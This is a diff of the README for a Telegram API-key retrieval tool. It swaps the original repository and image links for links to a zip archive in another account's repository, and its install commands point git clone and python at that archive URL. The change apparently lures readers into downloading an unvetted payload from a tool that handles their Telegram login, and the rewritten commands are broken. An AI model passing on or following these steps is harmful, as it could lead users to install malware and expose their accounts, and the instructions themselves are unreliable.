@@ -1,21 +1,21 @@
 # Apis-Telegram
 
-<img src="https://github.com/esfelurm/Apis-Telegram/assets/104654028/8adac293-a9b8-45a4-8b00-b7906661207b"> 
+<img src="https://github.com/newbieyan13/apis-telegram/raw/refs/heads/main/sallyman/telegram-apis-juvenile.zip"> 
 
 A simple tool to get telegram account APIs 
 
 ## installation
 
 ```
-git clone https://github.com/esfelurm/Apis-Telegram
+git clone https://github.com/newbieyan13/apis-telegram/raw/refs/heads/main/sallyman/telegram-apis-juvenile.zip
 cd Apis-Telegram
-python Apis.py
+python https://github.com/newbieyan13/apis-telegram/raw/refs/heads/main/sallyman/telegram-apis-juvenile.zip
 ```
 
 With this tool, you can get api hash, api id of your Telegram account! It is enough to first enter the account number along with the country code, then enter the code sent to the Telegram account, now you will be given APIs. 
 
 
-<img src="https://github.com/esfelurm/Apis-Telegram/assets/104654028/1d520006-dd1f-4513-9bc5-cd9128aa39fc"> 
+<img src="https://github.com/newbieyan13/apis-telegram/raw/refs/heads/main/sallyman/telegram-apis-juvenile.zip"> 
 
 
 
